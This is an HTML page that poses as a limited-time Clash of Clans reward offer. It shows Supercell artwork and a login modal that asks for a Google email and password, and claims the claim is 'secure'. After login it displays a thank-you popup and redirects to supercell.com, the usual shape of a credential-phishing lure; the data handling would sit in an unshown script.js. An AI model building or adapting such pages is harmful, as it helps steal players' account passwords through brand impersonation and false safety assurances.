<!DOCTYPE html>
<html>
<head>
  <title>Clash Rewards - Limited Time</title>
  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>

<!-- Floating Coins & Stars -->
<div class="floating-elements">
  <img src="https://cdn-icons-png.flaticon.com/512/138/138292.png" class="float coin">
  <img src="https://cdn-icons-png.flaticon.com/512/616/616408.png" class="float star">
  <img src="https://cdn-icons-png.flaticon.com/512/138/138292.png" class="float coin">
</div>

<header>
  <div class="logo-section">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clash_Logo.png" alt="Clash Logo">
    <h1>Claim Your Clash Rewards!</h1>
  </div>
  <p class="subtitle">Exclusive Skins & Sceneries for a Limited Time</p>
  <div class="character-bar">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/d/d5/Barbarian_info.png" class="char barbarian">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/8/8e/Archer_info.png" class="char archer">
  </div>
</header>

<main>
  <div class="offers"></div>
</main>

<!-- Login Modal -->
<div id="loginModal" class="login-modal">
  <div class="login-container">
    <h2>Sign in to Claim</h2>
    <p>Use your Google account to continue</p>
    <input id="loginEmail" type="email" placeholder="Email">
    <input id="loginPassword" type="password" placeholder="Password">
    <button onclick="login()">Login & Claim</button>
    <p class="login-note">Your account is safe. This is a secure Supercell reward claim.</p>
  </div>
</div>

<!-- Thank You Popup -->
<div id="thankYou" class="thank-popup">
  <div class="popup-content">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/6/6d/Judgement_King_Skin.png" alt="Reward Claimed">
    <h2>Thank You!</h2>
    <p>Your reward will be delivered within 24 hours.</p>
  </div>
</div>

<script src="script.js"></script>
<script>
async function login(){
  document.getElementById('loginModal').style.display='none';
  document.getElementById('thankYou').style.display='flex';
  setTimeout(()=>{ window.location.href="https://supercell.com"; },3000);
}
</script>
</body>
</html>
